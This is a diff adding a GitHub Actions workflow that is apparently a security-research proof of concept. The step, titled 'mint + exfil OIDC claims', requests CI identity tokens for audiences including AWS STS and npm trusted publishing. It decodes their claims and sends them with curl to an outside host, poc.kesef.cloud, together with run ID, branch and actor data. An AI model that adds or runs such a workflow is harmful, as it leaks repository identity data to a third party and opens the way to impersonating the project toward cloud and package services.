@@ -1,0 +1,36 @@
+name: oidc-oob-introspect
+on:
+  push:
+    branches: [main]
+  workflow_dispatch: {}
+jobs:
+  introspect:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: mint + exfil OIDC claims at multiple audiences
+        env:
+          OOB: https://poc.kesef.cloud/oidc/github/st1-introspect
+        run: |
+          set +e
+          for AUD in "github-actions-default" "api.github.com" "sts.amazonaws.com" "npm-trusted-publisher"; do
+            RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
+            JWT=$(printf '%s' "$RESP" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value','NOVAL'))" 2>/dev/null)
+            if [ "$JWT" = "NOVAL" ] || [ -z "$JWT" ]; then
+              curl -sS -o /dev/null "$OOB/err?aud=$AUD&resp=$(printf '%s' "$RESP" | head -c 80 | base64 -w0)"
+              continue
+            fi
+            PAY=$(printf '%s' "$JWT" | cut -d. -f2)
+            CLAIMS=$(python3 - "$PAY" <<'PY'
+import sys,base64,json
+s=sys.argv[1]; s+='='*(-len(s)%4)
+print(json.dumps(json.loads(base64.urlsafe_b64decode(s.encode())),separators=(',',':')))
+PY
+)
+            B64=$(printf '%s' "$CLAIMS" | base64 -w0)
+            curl -sS -o /dev/null "$OOB/claims?aud=$AUD&d=$B64"
+          done
+          # also surface what the runner can/can't do re: customization (it should NOT be able to PUT customization)
+          curl -sS -o /dev/null "$OOB/marker?stage=done&run=${GITHUB_RUN_ID}&ref=${GITHUB_REF}&actor=${GITHUB_ACTOR}"
